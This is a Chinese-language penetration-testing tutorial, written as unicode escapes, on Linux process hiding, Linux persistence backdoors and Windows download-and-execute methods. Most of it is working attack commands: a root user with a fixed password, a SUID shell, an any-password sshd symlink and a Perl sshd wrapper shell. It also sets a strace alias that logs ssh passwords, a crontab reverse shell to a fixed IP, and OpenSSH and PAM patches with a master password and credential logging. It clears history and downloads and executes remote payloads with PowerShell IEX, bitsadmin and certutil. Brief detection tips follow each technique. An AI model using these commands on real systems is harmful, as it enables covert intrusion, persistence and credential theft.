Cymothoa\u662f\u4e00\u6b3e\u9690\u79d8\u7684\u540e\u95e8\u5de5\u5177\u3002\u5b83\u901a\u8fc7\u5411\u76ee\u6807\u4e3b\u673a\u6d3b\u8dc3\u7684\u8fdb\u7a0b\u6ce8\u5165\u6076\u610f\u4ee3\u7801\uff0c\u4ece\u800c\u83b7\u53d6\u548c\u539f\u8fdb\u7a0b\u76f8\u540c\u7684\u6743\u9650\u3002\u8be5\u5de5\u5177\u6700\u5927\u7684\u4f18\u70b9\u5c31\u662f\u4e0d\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\uff0c\u4e0d\u5bb9\u6613\u88ab\u53d1\u73b0\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/ # \u4e0b\u8f7d\u89e3\u538b wget https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-1-beta/cymothoa-1-beta.tar.gz tar zxvf cymothoa-1-beta.tar.gz # cd cymothoa-1-beta && make 0x07 \u7ed3\u8bed \u00b6 \u672c\u6587\u4e3b\u8981\u4ecb\u7ecd\u4e86Linux\u4e0b\u7684\u51e0\u79cd\u9690\u85cf\u6280\u672f\uff0c\u5305\u62ec\u9690\u85cf\u6587\u4ef6\u3001\u9690\u85cf\u6743\u9650\u3001\u9690\u85cf\u5386\u53f2\u64cd\u4f5c\u547d\u4ee4\u3001\u7aef\u53e3\u590d\u7528\u3001\u8fdb\u7a0b\u9690\u85cf\u7b49\u65b9\u9762\u7684\u6280\u5de7\u3002\u4ec5\u4f5c\u629b\u7816\u5f15\u7389\u4e4b\u7528\uff0c\u6b22\u8fce\u7559\u8a00\u5206\u4eab\u3002 \u53c2\u8003\u6587\u7ae0\uff1a Tiny Shell \u8fd9\u6b3e\u5de5\u5177\u901a\u8fc7\u5728\u6e90\u7801\u4e2d\u8bbe\u7f6ePROCESS_NAME\u4e3abash\uff0c\u4ee5\u4f7f\u5f97\u5176\u8fd0\u884c\u540e\u7684\u8fdb\u7a0b\u540d\u663e\u793a\u4e3abash\u3002 \u5728\u6076\u610f\u4ee3\u7801\u4e2d\u901a\u8fc7\u8bbe\u7f6e\u5177\u6709\u8ff7\u60d1\u6027\u7684\u8fdb\u7a0b\u540d\u5b57\uff0c\u4ee5\u8fbe\u5230\u8eb2\u907f\u7ba1\u7406\u5458\u68c0\u67e5\u7684\u76ee\u7684\u3002 https://github.com/orangetw/tsh \u53c2\u8003\u6587\u7ae0\uff1a https://www.freebuf.com/sectool/138350.html mount-bind \u5229\u7528mount \u2014bind \u5c06\u53e6\u5916\u4e00\u4e2a\u76ee\u5f55\u6302\u8f7d\u8986\u76d6\u81f3/proc/\u76ee\u5f55\u4e0b\u6307\u5b9a\u8fdb\u7a0bID\u7684\u76ee\u5f55 \u804a\u4e00\u804aLinux\u4e0b\u8fdb\u7a0b\u9690\u85cf\u7684\u5e38\u89c1\u624b\u6cd5\u53ca\u4fa6\u6d4b\u624b\u6bb5 https://www.anquanke.com/post/id/160843 \u53cd\u5165\u4fb5\u4e4b\u53d1\u73b0\u540e\u95e8\u5229\u7528mount-bind\u5c06\u8fdb\u7a0b\u548c\u7aef\u53e3\u4fe1\u606f\u9690\u533f https://www.freebuf.com/articles/network/140535.html https://blog.csdn.net/liuqz2009/article/details/43530201 Linux \u5171\u4eab\u5e93\u6ce8\u5165\u540e\u95e8 linux \u8fdb\u7a0b\u6ce8\u5165\u540e\u95e8\u5de5\u5177Cymothoa \u5982\u4f55\u9690\u85cf\u4f60\u7684 Linux \u7684\u547d\u4ee4\u884c\u5386\u53f2 https://www.linuxprobe.com/hidden-cmd-history.html \u5229\u7528sslh\u5b9e\u73b0\u7aef\u53e3\u590d\u7528 https://www.bbsmax.com/A/QW5YwpWezm/ \u8fdc\u7a0b\u9065\u63a7 IPTables \u8fdb\u884c\u7aef\u53e3\u590d\u7528 https://www.freebuf.com/articles/network/137683.html Venom \u591a\u7ea7\u4ee3\u7406\u5de5\u5177 linux \u4e0b\u9690\u85cf\u8fdb\u7a0b\u7684\u4e00\u79cd\u65b9\u6cd5\u53ca\u9047\u5230\u7684\u5751 https://www.jb51.net/article/147024.htm \u5982\u4f55\u5728 Linux/Unix/Windows \u4e2d\u53d1\u73b0\u9690\u85cf\u7684\u8fdb\u7a0b\u548c\u7aef\u53e3 https://linux.cn/article-9288-1.html \u7b2c4\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7 \u00b6 \u672c\u6587\u5c06\u5bf9Linux\u4e0b\u5e38\u89c1\u7684\u6743\u9650\u7ef4\u6301\u6280\u672f\u8fdb\u884c\u89e3\u6790\uff0c\u77e5\u5df1\u77e5\u5f7c\u767e\u6218\u4e0d\u6b86\u3002 1\u3001\u4e00\u53e5\u8bdd\u6dfb\u52a0\u7528\u6237\u548c\u5bc6\u7801 \u6dfb\u52a0\u666e\u901a\u7528\u6237\uff1a # \u521b\u5efa\u4e00\u4e2a\u7528\u6237\u540dguest\uff0c\u5bc6\u7801123456\u7684\u666e\u901a\u7528\u6237 useradd -p `openssl passwd -1 -salt 'salt' 123456` guest # useradd -p \u65b9\u6cd5 ` ` \u662f\u7528\u6765\u5b58\u653e\u53ef\u6267\u884c\u7684\u7cfb\u7edf\u547d\u4ee4,\"$()\"\u4e5f\u53ef\u4ee5\u5b58\u653e\u547d\u4ee4\u6267\u884c\u8bed\u53e5 useradd -p \"$(openssl passwd -1 123456)\" guest # chpasswd\u65b9\u6cd5 useradd guest;echo 'guest:123456'|chpasswd # echo -e\u65b9\u6cd5 useradd test;echo -e \"123456\\n123456\\n\" |passwd test \u6dfb\u52a0root\u7528\u6237\uff1a # \u521b\u5efa\u4e00\u4e2a\u7528\u6237\u540dguest\uff0c\u5bc6\u7801123456\u7684root\u7528\u6237 useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test \u53ef\u7591\u7528\u6237\u6392\u67e5\u6280\u5de7\uff1a # \u67e5\u8be2\u7279\u6743\u7528\u6237\u7279\u6743\u7528\u6237(uid \u4e3a0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd # \u67e5\u8be2\u53ef\u4ee5\u8fdc\u7a0b\u767b\u5f55\u7684\u5e10\u53f7\u4fe1\u606f [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow # \u9664root\u5e10\u53f7\u5916\uff0c\u5176\u4ed6\u5e10\u53f7\u662f\u5426\u5b58\u5728sudo\u6743\u9650\u3002\u5982\u975e\u7ba1\u7406\u9700\u8981\uff0c\u666e\u901a\u5e10\u53f7\u5e94\u5220\u9664sudo\u6743\u9650 [root@localhost ~]# more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\" 2\u3001SUID Shell Suid shell\u662f\u4e00\u79cd\u53ef\u7528\u4e8e\u4ee5\u62e5\u6709\u8005\u6743\u9650\u8fd0\u884c\u7684shell\u3002 \u914d\u5408\u666e\u901a\u7528\u6237\u6743\u9650\u4f7f\u7528 cp /bin/bash /tmp/shell chmod u+s /tmp/shell \u4f7f\u7528guest\u7528\u6237\u767b\u5f55\u5c31\u53ef\u7591\u83b7\u53d6root\u6743\u9650\u3002 \u5907\u6ce8\uff1abash2\u9488\u5bf9suid\u505a\u4e86\u4e00\u4e9b\u9632\u62a4\u63aa\u65bd\uff0c\u9700\u8981\u4f7f\u7528-p\u53c2\u6570\u6765\u83b7\u53d6\u4e00\u4e2aroot shell\u3002\u53e6\u5916\uff0c\u666e\u901a\u7528\u6237\u6267\u884c\u8fd9\u4e2aSUID shell\u65f6\uff0c\u4e00\u5b9a\u8981\u4f7f\u7528\u5168\u8def\u5f84\u3002 \u6392\u67e5\u6280\u5de7\uff1a # \u5728Linux\u4e2d\u67e5\u627eSUID\u8bbe\u7f6e\u7684\u6587\u4ef6 find . -perm /4000 # \u5728Linux\u4e2d\u67e5\u627e\u4f7f\u7528SGID\u8bbe\u7f6e\u7684\u6587\u4ef6 find . -perm /2000 # \u53d6\u6d88s\u6743\u9650 chmod u-s /tmp/shell 3\u3001ssh\u516c\u79c1\u94a5\u514d\u5bc6\u767b\u5f55 \u5728\u5ba2\u6237\u7aef\u4e0a\u751f\u6210\u4e00\u5bf9\u516c\u79c1\u94a5\uff0c\u7136\u540e\u628a\u516c\u94a5\u653e\u5230\u670d\u52a1\u5668\u4e0a\uff08~/.ssh/authorized_keys\uff09\uff0c\u4fdd\u7559\u79c1\u94a5\u3002\u5f53ssh\u767b\u5f55\u65f6\uff0cssh\u7a0b\u5e8f\u4f1a\u53d1\u9001\u79c1\u94a5\u53bb\u548c\u670d\u52a1\u5668\u4e0a\u7684\u516c\u94a5\u505a\u5339\u914d\u3002\u5982\u679c\u5339\u914d\u6210\u529f\u5c31\u53ef\u4ee5\u767b\u5f55\u4e86\u3002 \u5ba2\u6237\u7aef\uff1a ssh-keygen -t rsa \u8fc7\u7a0b\u4e2d\u6309\u4e09\u6b21\u56de\u8f66\uff0c\u6267\u884c\u7ed3\u675f\u5982\u4e0b\u56fe: \u8fdb\u5165/root/.ssh/\u6587\u4ef6\u5939\uff0c\u67e5\u770b\u6587\u4ef6\u5939\u7684\u5185\u5bb9\uff0c\u5982\u4e0b\u6240\u793a\uff1a \u5176\u4e2d id_rsa \u4e3a\u79c1\u94a5\uff0c id_rsa.pub \u4e3a\u516c\u94a5\uff0c\u63a5\u4e0b\u6765\u6253\u5f00 id_rsa.pub \uff0c\u5c06\u5185\u5bb9\u590d\u5236\u5230\u670d\u52a1\u5668\u3002\u5c06 id_rsa.pub \u7684\u5185\u5bb9\u8ffd\u52a0\u5230 /root/.ssh/authorized_keys \u5185\uff0c\u914d\u7f6e\u5b8c\u6210\u3002 \u6392\u67e5\u6280\u5de7\uff1a\u67e5\u770b /root/.ssh/authorized_keys \u662f\u5426\u88ab\u4fee\u6539\u3002 4\u3001\u8f6f\u8fde\u63a5 \u5728sshd\u670d\u52a1\u914d\u7f6e\u8fd0\u884cPAM\u8ba4\u8bc1\u7684\u524d\u63d0\u4e0b\uff0cPAM\u914d\u7f6e\u6587\u4ef6\u4e2d\u63a7\u5236\u6807\u5fd7\u4e3asufficient\u65f6\u53ea\u8981pam_rootok\u6a21\u5757\u68c0\u6d4buid\u4e3a0\u5373root\u6743\u9650\u5373\u53ef\u6210\u529f\u8ba4\u8bc1\u767b\u9646\u3002\u901a\u8fc7\u8f6f\u8fde\u63a5\u7684\u65b9\u5f0f\uff0c\u5b9e\u8d28\u4e0aPAM\u8ba4\u8bc1\u662f\u901a\u8fc7\u8f6f\u8fde\u63a5\u7684\u6587\u4ef6\u540d /tmp/su \u5728 /etc/pam.d/ \u76ee\u5f55\u4e0b\u5bfb\u627e\u5bf9\u5e94\u7684PAM\u914d\u7f6e\u6587\u4ef6(\u5982: /etc/pam.d/su)\uff0c\u4efb\u610f\u5bc6\u7801\u767b\u9646\u7684\u6838\u5fc3\u662f auth sufficient pam_rootok.so \uff0c\u6240\u4ee5\u53ea\u8981PAM\u914d\u7f6e\u6587\u4ef6\u4e2d\u5305\u542b\u6b64\u914d\u7f6e\u5373\u53efSSH\u4efb\u610f\u5bc6\u7801\u767b\u9646\uff0c\u9664\u4e86su\u4e2d\u4e4b\u5916\u8fd8\u6709chsh\u3001chfn\u540c\u6837\u53ef\u4ee5\u3002 \u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4e00\u53e5\u8bdd\u540e\u95e8\uff1a ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888 \u6267\u884c\u5b8c\u4e4b\u540e\uff0c\u4efb\u4f55\u4e00\u53f0\u673a\u5668 ssh root@IP -p 8888 \uff0c\u8f93\u5165\u4efb\u610f\u5bc6\u7801\uff0c\u6210\u529f\u767b\u5f55\u3002 \u6392\u67e5\u6280\u5de7\uff1a\u8fdb\u7a0b\u3001\u7aef\u53e3\u90fd\u53ef\u4ee5\u53d1\u73b0\u5f02\u5e38\uff0c kill -s 9 PID \u7ed3\u675f\u8fdb\u7a0b\u5373\u53ef\u6e05\u9664\u540e\u95e8\u3002 5\u3001SSH wrapper \u9996\u5148\u542f\u52a8\u7684\u662f/usr/sbin/sshd,\u811a\u672c\u6267\u884c\u5230getpeername\u8fd9\u91cc\u7684\u65f6\u5019\uff0c\u6b63\u5219\u5339\u914d\u4f1a\u5931\u8d25\uff0c\u4e8e\u662f\u6267\u884c\u4e0b\u4e00\u53e5\uff0c\u542f\u52a8/usr/bin/sshd\uff0c\u8fd9\u662f\u539f\u59cbsshd\u3002\u539f\u59cb\u7684sshd\u76d1\u542c\u7aef\u53e3\u5efa\u7acb\u4e86tcp\u8fde\u63a5\u540e\uff0c\u4f1afork\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u5904\u7406\u5177\u4f53\u5de5\u4f5c\u3002\u8fd9\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u6ca1\u6709\u4ec0\u4e48\u68c0\u9a8c\uff0c\u800c\u662f\u76f4\u63a5\u6267\u884c\u7cfb\u7edf\u9ed8\u8ba4\u7684\u4f4d\u7f6e\u7684/usr/sbin/sshd\uff0c\u8fd9\u6837\u5b50\u63a7\u5236\u6743\u53c8\u56de\u5230\u811a\u672c\u4e86\u3002\u6b64\u65f6\u5b50\u8fdb\u7a0b\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u5df2\u88ab\u91cd\u5b9a\u5411\u5230\u5957\u63a5\u5b57\uff0cgetpeername\u80fd\u771f\u7684\u83b7\u53d6\u5230\u5ba2\u6237\u7aef\u7684TCP\u6e90\u7aef\u53e3\uff0c\u5982\u679c\u662f19526\u5c31\u6267\u884csh\u7ed9\u4e2ashell \u7b80\u5355\u70b9\u5c31\u662f\u4ecesshd fork\u51fa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u8f93\u5165\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u5957\u63a5\u5b57\uff0c\u5e76\u5bf9\u8fde\u8fc7\u6765\u7684\u5ba2\u6237\u7aef\u7aef\u53e3\u8fdb\u884c\u4e86\u5224\u65ad\u3002 \u670d\u52a1\u7aef\uff1a cd /usr/sbin/ mv sshd ../bin/ echo '#!/usr/bin/perl' >sshd echo 'exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/);' >>sshd echo 'exec{\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV,' >>sshd chmod u+x sshd /etc/init.d/sshd restart \u5ba2\u6237\u7aef\uff1a socat STDIO TCP4:target_ip:22,sourceport=13377 #\u5982\u679c\u4f60\u60f3\u4fee\u6539\u6e90\u7aef\u53e3\uff0c\u53ef\u4ee5\u7528python\u7684struct\u6807\u51c6\u5e93\u5b9e\u73b0\u3002\u5176\u4e2dx00x00LF\u662f19526\u7684\u5927\u7aef\u5f62\u5f0f\uff0c\u4fbf\u4e8e\u4f20\u8f93\u548c\u5904\u7406\u3002 >>> import struct >>> buffer = struct.pack('>I6',19526) >>> print repr(buffer) '\\x00\\x00LF' >>> buffer = struct.pack('>I6',13377) >>> print buffer 4A \u6392\u67e5\u6280\u5de7\uff1a # ls -al /usr/sbin/sshd # cat /usr/sbin/sshd \u53ef\u901a\u8fc7\u91cd\u88c5ssh\u670d\u52a1\u6062\u590d\u3002 6\u3001strace\u540e\u95e8 \u901a\u8fc7\u547d\u4ee4\u66ff\u6362\u52a8\u6001\u8ddf\u8e2a\u7cfb\u7edf\u8c03\u7528\u548c\u6570\u636e\uff0c\u53ef\u4ee5\u7528\u6765\u8bb0\u5f55\u7528\u6237ssh\u3001su\u3001sudo\u7684\u64cd\u4f5c\u3002 #vim /etc/bashrc alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh' # source /root/.bashrc \u6392\u67e5\u6280\u5de7\uff1a\u4f7f\u7528 alias \u5373\u53ef\u53d1\u73b0\u5f02\u5e38\u3002 7\u3001crontab\u53cd\u5f39shell crontab\u547d\u4ee4\u7528\u4e8e\u8bbe\u7f6e\u5468\u671f\u6027\u88ab\u6267\u884c\u7684\u6307\u4ee4\u3002\u65b0\u5efashell\u811a\u672c\uff0c\u5229\u7528\u811a\u672c\u8fdb\u884c\u53cd\u5f39\u3002 a\u3001\u521b\u5efashell\u811a\u672c\uff0c\u4f8b\u5982\u5728/etc/evil.sh #!/bin/bash bash -i >& /dev/tcp/192.168.28.131/12345 0>&1 chmod +sx /etc/evil.sh b\u3001crontab -e \u8bbe\u7f6e\u5b9a\u65f6\u4efb\u52a1 #\u6bcf\u4e00\u5206\u949f\u6267\u884c\u4e00\u6b21 */1 * * * * root /etc/evil.sh \u91cd\u542fcrond\u670d\u52a1\uff0c service crond restart \uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u7528nc\u63a5\u6536shell\u3002 \u6392\u67e5\u6280\u5de7\uff1a # \u67e5\u770b\u53ef\u7591\u7684\u5b9a\u65f6\u4efb\u52a1\u5217\u8868 crontab -e 8\u3001openssh\u540e\u95e8 \u5229\u7528openssh\u540e\u95e8\uff0c\u8bbe\u7f6eSSH\u540e\u95e8\u5bc6\u7801\u53caroot\u5bc6\u7801\u8bb0\u5f55\u4f4d\u7f6e\uff0c\u9690\u853d\u6027\u8f83\u5f3a\uff0c\u4e0d\u6613\u88ab\u53d1\u73b0\u3002 a\u3001\u5907\u4efdSSH\u914d\u7f6e\u6587\u4ef6 mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old b\u3001\u89e3\u538b\u5e76\u5b89\u88c5\u8865\u4e01 tar zxf openssh-5.9p1.tar.gz tar zxf openssh-5.9p1.tar.gz cp openssh-5.9p1.patch/sshbd5.9p1.diff /openssh-5.9p1 cd openssh-5.9p1 patch < sshbd5.9p1.diff c\u3001\u8bb0\u5f55\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u6587\u4ef6\u4f4d\u7f6e\u53ca\u5176\u5bc6\u7801 vi includes.h #define ILOG \"/tmp/1.txt\" //\u8bb0\u5f55\u767b\u5f55\u672c\u673a\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801 #define OLOG \"/tmp/2.txt\" //\u8bb0\u5f55\u672c\u673a\u767b\u5f55\u8fdc\u7a0b\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801 #define SECRETPW \"123456789\" //\u540e\u95e8\u7684\u5bc6\u7801 d\u3001\u4fee\u6539\u7248\u672c\u4fe1\u606f vi version.h #define SSH_VERSION \"\u586b\u5165\u4e4b\u524d\u8bb0\u4e0b\u6765\u7684\u7248\u672c\u53f7,\u4f2a\u88c5\u539f\u7248\u672c\" #define SSH_PORTABLE \"\u5c0f\u7248\u672c\u53f7\" e\u3001\u5b89\u88c5\u5e76\u7f16\u8bd1 ./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 make clean make && make install service sshd restart f\u3001\u5bf9\u6bd4\u539f\u6765\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u4f7f\u914d\u7f6e\u6587\u4ef6\u4e00\u81f4\uff0c\u7136\u540e\u4fee\u6539\u6587\u4ef6\u65e5\u671f\u3002 touch -r /etc/ssh/ssh_config.old /etc/ssh/ssh_config touch -r /etc/ssh/sshd_config.old /etc/ssh/sshd_config g\u3001\u6e05\u9664\u64cd\u4f5c\u8bb0\u5f55 export HISTFILE=/dev/null export HISTSIZE=0 echo >/root/.bash_history //\u6e05\u7a7a\u64cd\u4f5c\u65e5\u5fd7 \u6392\u67e5\u6280\u5de7\uff1a\u5229\u7528strace\u627e\u51fassh\u540e\u95e8. # 1\u3001\u83b7\u53d6\u53ef\u7591\u8fdb\u7a0bPI ps aux | grep sshd # 2\u3001\u8ddf\u8e2asshd PID strace -o aa -ff -p PID # 3\u3001\u67e5\u770b\u8bb0\u5f55\u5bc6\u7801\u6253\u5f00\u6587\u4ef6 grep open sshd* | grep -v -e No -e null -e denied| grep WR 9\u3001PAM\u540e\u95e8 PAM \uff08Pluggable Authentication Modules \uff09\u662f\u7531Sun\u63d0\u51fa\u7684\u4e00\u79cd\u8ba4\u8bc1\u673a\u5236\u3002\u5b83\u901a\u8fc7\u63d0\u4f9b\u4e00\u4e9b\u52a8\u6001\u94fe\u63a5\u5e93\u548c\u4e00\u5957\u7edf\u4e00\u7684API\uff0c\u5c06\u7cfb\u7edf\u63d0\u4f9b\u7684\u670d\u52a1\u548c\u8be5\u670d\u52a1\u7684\u8ba4\u8bc1\u65b9\u5f0f\u5206\u5f00\uff0c\u4f7f\u5f97\u7cfb\u7edf\u7ba1\u7406\u5458\u53ef\u4ee5\u7075\u6d3b\u5730\u6839\u636e\u9700\u8981\u7ed9\u4e0d\u540c\u7684\u670d\u52a1\u914d\u7f6e\u4e0d\u540c\u7684\u8ba4\u8bc1\u65b9\u5f0f\u800c\u65e0\u9700\u66f4\u6539\u670d\u52a1\u7a0b\u5e8f\uff0c\u540c\u65f6\u4e5f\u4fbf\u4e8e\u5411\u7cfb\u7edf\u4e2d\u6dfb\u52a0\u65b0\u7684\u8ba4\u8bc1\u624b\u6bb5\u3002PAM\u6700\u521d\u662f\u96c6\u6210\u5728Solaris\u4e2d\uff0c\u76ee\u524d\u5df2\u79fb\u690d\u5230\u5176\u5b83\u7cfb\u7edf\u4e2d\uff0c\u5982Linux\u3001SunOS\u3001HP-UX 9.0\u7b49\u3002 \u5229\u7528\u65b9\u6cd5: 1\u3001\u83b7\u53d6\u76ee\u6807\u7cfb\u7edf\u6240\u4f7f\u7528\u7684PAM\u7248\u672c\uff0c\u4e0b\u8f7d\u5bf9\u5e94\u7248\u672c\u7684pam\u7248\u672c 2\u3001\u89e3\u538b\u7f29\uff0c\u4fee\u6539pam_unix_auth.c\u6587\u4ef6\uff0c\u6dfb\u52a0\u4e07\u80fd\u5bc6\u7801 3\u3001\u7f16\u8bd1\u5b89\u88c5PAM 4\u3001\u7f16\u8bd1\u5b8c\u540e\u7684\u6587\u4ef6\u5728\uff1amodules/pam_unix/.libs/pam_unix.so\uff0c\u590d\u5236\u5230/lib64/security\u4e2d\u8fdb\u884c\u66ff\u6362\uff0c\u5373\u53ef\u4f7f\u7528\u4e07\u80fd\u5bc6\u7801\u767b\u9646\uff0c\u5e76\u5c06\u7528\u6237\u540d\u5bc6\u7801\u8bb0\u5f55\u5230\u6587\u4ef6\u4e2d\u3002 \u6392\u67e5\u6280\u5de7\uff1a # 1\u3001\u901a\u8fc7Strace\u8ddf\u8e2assh ps axu | grep sshd strace -o aa -ff -p PID grep open aa* | grep -v -e No -e null -e denied| grep WR # 2\u3001\u68c0\u67e5pam_unix.so\u7684\u4fee\u6539\u65f6\u95f4 stat /lib/security/pam_unix.so #32\u4f4d stat /lib64/security/pam_unix.so #64\u4f4d 10\u3001rookit\u540e\u95e8 Mafix\u662f\u4e00\u6b3e\u5e38\u7528\u7684\u8f7b\u91cf\u5e94\u7528\u7ea7\u522bRootkits\uff0c\u662f\u901a\u8fc7\u4f2a\u9020ssh\u534f\u8bae\u6f0f\u6d1e\u5b9e\u73b0\u8fdc\u7a0b\u767b\u9646\u7684\u7279\u70b9\u662f\u914d\u7f6e\u7b80\u5355\u5e76\u53ef\u4ee5\u81ea\u5b9a\u4e49\u9a8c\u8bc1\u5bc6\u7801\u548c\u7aef\u53e3\u53f7\u3002 \u5229\u7528\u65b9\u6cd5\uff1a\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u4f7f\u7528ssh \u7528\u6237@IP -P \u914d\u7f6e\u7684\u7aef\u53e3\uff0c\u5373\u53ef\u8fdc\u7a0b\u767b\u5f55\u3002 \u8fde\u63a5\u540e\u7684\u622a\u56fe\uff1a \u6392\u67e5\u6280\u5de7\uff1a\u67e5\u770b\u7aef\u53e3\u662f\u5426\u5f02\u5e38\uff0cRPM check\u67e5\u770b\u547d\u4ee4\u662f\u5426\u88ab\u66ff\u6362\u3002 \u53c2\u8003\u94fe\u63a5\uff1a LINUX\u7684\u4e24\u79cd\u540e\u95e8\u603b\u7ed3(suid shell\u4e0einetd) https://www.cnblogs.com/milantgh/p/3601812.html linux\u540e\u95e8\u603b\u7ed3 https://www.cnblogs.com/zaqzzz/p/12099463.html https://www.secpulse.com/archives/100484.html linux\u5404\u79cd\u4e00\u53e5\u8bdd\u53cd\u5f39shell\u603b\u7ed3 https://yq.aliyun.com/articles/519250?type=2 Linux OpenSSH\u540e\u95e8\u7684\u6dfb\u52a0\u4e0e\u9632\u8303 https://yq.aliyun.com/articles/69350 Linux\u540e\u95e8\u6574\u7406\u5408\u96c6 https://www.cnblogs.com/maplered/p/9224617.html https://www.cnblogs.com/zlgxzswjy/p/6209571.html linux \u540e\u95e8 https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/ \u7b2c5\u7bc7\uff1aWindows\u547d\u4ee4\u884c\u6587\u4ef6\u4e0b\u8f7d\u65b9\u5f0f\u6c47\u603b \u00b6 \u5f53\u6211\u4eec\u901a\u8fc7Web\u6e17\u900f\u83b7\u53d6\u4e86\u4e00\u4e2aShell\uff0c\u800c\u4e14\u76ee\u6807\u4e3b\u673a\u662fWindows\uff0c\u6211\u4eec\u8be5\u600e\u4e48\u53bb\u4e0b\u8f7d\u540e\u95e8\u6587\u4ef6\u5230\u76ee\u6807\u4e3b\u673a\u4e0a\u6267\u884c\u5462\uff1f \u4e00\u822c\u6765\u8bf4\uff0c\u5b9e\u73b0Windows\u6587\u4ef6\u4e0b\u8f7d\u6267\u884c\u7684\u65b9\u5f0f\u4e0d\u5916\u4e4e\u4ee5\u4e0b\u51e0\u79cd\u65b9\u5f0f\u3002\u7b2c\u4e00\u79cd\uff0c\u8fdc\u7a0b\u4e0b\u8f7d\u6587\u4ef6\u5230\u672c\u5730\uff0c\u7136\u540e\u518d\u6267\u884c\uff1b \u7b2c\u4e8c\u79cd\uff0c\u8fdc\u7a0b\u4e0b\u8f7d\u6267\u884c\uff0c\u6267\u884c\u8fc7\u7a0b\u6ca1\u6709\u4e8c\u8fdb\u5236\u6587\u4ef6\u843d\u5730\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5df2\u7136\u6210\u4e3a\u540e\u95e8\u6587\u4ef6\u4e0b\u8f7d\u6267\u884c\u7684\u9996\u8981\u65b9\u5f0f** \u3002**\u53e6\u5916\u5462\uff0c\u53ea\u8981\u4f60\u6240\u5728\u670d\u52a1\u5668\u7684\u73af\u5883\u652f\u6301\uff0c\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4efb\u4f55\u4e00\u95e8\u8bed\u8a00\u6765\u5b9e\u73b0\u5b83\uff0c\u8fd9\u79cd\u65b9\u5f0f\u6682\u4e0d\u5728\u672c\u6587\u7684\u8ba8\u8bba\u8303\u56f4\u4e4b\u5185\u3002 \u5728\u8fd9\u91cc\uff0c****\u672c\u6587\u6536\u96c6\u4e8615\u79cd\u5e38\u89c1\u7684\u6587\u4ef6\u4e0b\u8f7d\u6267\u884c\u7684\u65b9\u5f0f\uff0c\u5e76\u7ed3\u5408\u5177\u4f53\u6848\u4f8b \uff0c\u8ba9\u6211\u4eec\u4e00\u8d77\u6765\u770b\u770b\u662f\u600e\u4e48\u5b9e\u73b0\u7684\u5427\u3002 PowerShell Bitsadmin certutil wget ipc$\u6587\u4ef6\u5171\u4eab FTP TFTP WinScp msiexec IEExec mshta rundll32 regsvr32 MSXSL.EXE pubprn.vbs 1\u3001PowerShell PowerShell\u662f\u4e00\u79cd\u547d\u4ee4\u884c\u5916\u58f3\u7a0b\u5e8f\u548c\u811a\u672c\u73af\u5883\uff0c\u4f7f\u547d\u4ee4\u884c\u7528\u6237\u548c\u811a\u672c\u7f16\u5199\u8005\u53ef\u4ee5\u5229\u7528\u3002 \u8fdc\u7a0b\u4e0b\u8f7d\u6587\u4ef6\u4fdd\u5b58\u5728\u672c\u5730\uff1a powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.28.128/imag/evil.txt','evil.exe') \u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\uff1a powershell -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/imag/evil.txt'))\" 2\u3001Bitsadmin bitsadmin\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u53ef\u7528\u4e8e\u521b\u5efa\u4e0b\u8f7d\u6216\u4e0a\u4f20\u5de5\u4f5c\u548c\u76d1\u6d4b\u5176\u8fdb\u5c55\u60c5\u51b5\u3002 bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\\test\\1.txt \u8f93\u5165\u4ee5\u4e0a\u547d\u4ee4\uff0c\u6210\u529f\u4e0b\u8f7d\u6587\u4ef6\u3002 3\u3001certutil \u7528\u4e8e\u5907\u4efd\u8bc1\u4e66\u670d\u52a1\uff0c\u652f\u6301xp-win10\u90fd\u652f\u6301\u3002\u7531\u4e8ecertutil\u4e0b\u8f7d\u6587\u4ef6\u90fd\u4f1a\u7559\u4e0b\u7f13\u5b58\uff0c\u6240\u4ee5\u4e00\u822c\u90fd\u5efa\u8bae\u4e0b\u8f7d\u5b8c\u6587\u4ef6\u540e\u5bf9\u7f13\u5b58\u8fdb\u884c\u5220\u9664\u3002 \u6ce8\uff1a\u7f13\u5b58\u76ee\u5f55\u4e3a\uff1a\"%USERPROFILE%\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content\" #\u4e0b\u8f7d\u6587\u4ef6 certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php #\u5220\u9664\u7f13\u5b58 certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete 